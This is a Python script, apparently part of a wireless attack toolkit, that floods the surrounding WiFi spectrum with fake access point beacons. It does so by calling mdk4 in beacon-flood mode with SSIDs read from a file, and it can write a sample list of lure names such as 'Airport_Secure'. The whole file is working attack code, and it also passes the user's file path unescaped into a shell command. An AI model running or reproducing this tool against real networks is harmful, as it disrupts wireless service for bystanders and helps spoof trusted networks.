#!/usr/bin/env python3
"""
Floods the WiFi spectrum with multiple fake access point advertisements
by reading network names from a configuration file.
"""

import os
import subprocess
from ui import cprint, iprint, wprint, eprint, sprint, cinput, CYAN, YELLOW, RED, GREEN


class APNetworkFlooder:    
    def __init__(self, interface):
        self.interface = interface
        script_dir = os.path.dirname(os.path.abspath(__file__))
        self.default_list_file = os.path.join(script_dir, "data", "ap_networks.txt")
    
    def verify_monitor_mode(self):
        try:
            result = subprocess.run(
                ["iwconfig", self.interface],
                capture_output=True,
                text=True,
                timeout=5
            )
            if "Mode:Monitor" in result.stdout:
                return True
            else:
                eprint(f"{self.interface} is not in monitor mode!")
                return False
        except Exception as e:
            eprint(f"Error checking interface: {e}")
            return False
    
    def verify_network_list(self, filepath):
        if not os.path.exists(filepath):
            eprint(f"Network list file not found: {filepath}")
            return False
        
        try:
            with open(filepath, 'r') as f:
                networks = [line.strip() for line in f if line.strip()]
            
            if not networks:
                eprint("Network list file is empty!")
                return False
            
            iprint(f"Loaded {len(networks)} networks from file")
            return True
        except Exception as e:
            eprint(f"Error reading network list: {e}")
            return False
    
    def flood_networks_from_file(self, filepath):
        if not self.verify_monitor_mode():
            return False
        
        if not self.verify_network_list(filepath):
            return False
        
        cprint(f"\n[*] Starting AP network flood attack", CYAN)
        cprint(f"[*] Interface: {self.interface}", CYAN)
        cprint(f"[*] Network list: {filepath}", CYAN)
        cprint("[*] Press Ctrl+C to stop", YELLOW)
        
        try:
            cmd = f"sudo mdk4 {self.interface} b -f '{filepath}' -m"
            subprocess.run(cmd, shell=True)
            return True
        except KeyboardInterrupt:
            wprint("Network flood stopped by user")
            return False
        except Exception as e:
            eprint(f"Error during flood: {e}")
            return False
    
    def create_sample_network_list(self):
        sample_networks = [
            "FreeWiFi",
            "Airport_Secure",
            "CoffeeShop",
            "GuestNetwork",
            "Hotel_WiFi",
            "School_Network",
            "Library_Public",
            "Admin_Panel",
            "TestNetwork",
            "Corporate_WiFi"
        ]
        
        try:
            with open(self.default_list_file, 'w') as f:
                for network in sample_networks:
                    f.write(f"{network}\n")
            
            sprint(f"Created sample network list: {self.default_list_file}")
            return True
        except Exception as e:
            eprint(f"Error creating sample file: {e}")
            return False
    
    def run_interactive(self):
        cprint("Select network list source:", CYAN)
        cprint("1) Use custom network list file")
        cprint("2) Create and use sample network list")
        print()
        
        choice = cinput("Select option")
        
        if choice == "1":
            filepath = cinput("Enter path to network list file (default: ap_networks.txt)")
            filepath = filepath if filepath else self.default_list_file
            self.flood_networks_from_file(filepath)
        elif choice == "2":
            if self.create_sample_network_list():
                self.flood_networks_from_file(self.default_list_file)
        else:
            wprint("Invalid selection")


if __name__ == "__main__":
    import sys
    interface = sys.argv[1] if len(sys.argv) > 1 else "wlan1mon"
    
    flooder = APNetworkFlooder(interface)
    flooder.run_interactive()
